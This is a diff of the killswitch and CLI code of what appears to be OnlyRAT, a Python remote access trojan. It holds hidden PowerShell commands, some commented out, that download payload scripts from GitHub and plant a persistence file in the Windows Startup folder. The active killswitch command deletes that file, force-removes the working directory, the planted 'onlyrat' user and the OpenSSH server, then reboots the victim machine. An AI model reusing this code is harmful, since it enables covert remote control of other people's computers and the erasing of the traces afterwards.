@@ -235,7 +235,7 @@ def killswitch(address, password, working, username):
     # killswitch_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killswitch.ps1 -OutFile {working}/TOhjZsWluf.ps1\""
     # killtask_command = f"powershell powershell.exe -windowstyle hidden \"Invoke-WebRequest -Uri raw.githubusercontent.com/CosmodiumCS/OnlyRAT/main/payloads/killtask.ps1 -OutFile {working}/SaReWIdGnz.ps1\""
     # controller_command = f"cd C:/Users/{username}/AppData/Roaming/Microsoft/Windows && cd \"Start Menu\" && cd Programs/Startup && echo powershell Start-Process powershell.exe -windowstyle hidden $env:temp/SaReWIdGnz.ps1 >> GiLqXiexKP.cmd"
-    killswitch_command = f"powershell /c Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd\"; powershell /c Remove-Item $env:temp/* -r -Force; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
+    killswitch_command = f"powershell /c Remove-Item \"C:/Users/{username}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/GiLqXiexKP.cmd\"; Remove-Item {working}/* -r -Force; Remove-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Remove-Item \"C:/Users/onlyrat\" -r -Force; Remove-LocalUser -Name \"onlyrat\"; shutdown /r"
     print("[+] Killswitch prepped")
 
     # installing killswitch
@@ -461,7 +461,6 @@ def cli(arguments):
                 confirm = input(header)
                 if confirm == "y":
                     killswitch(ipv4, password, working_direcory, target_username)
-                    remote_command(ipv4, password, "shutdown /r")
 
                 else:
                     main()
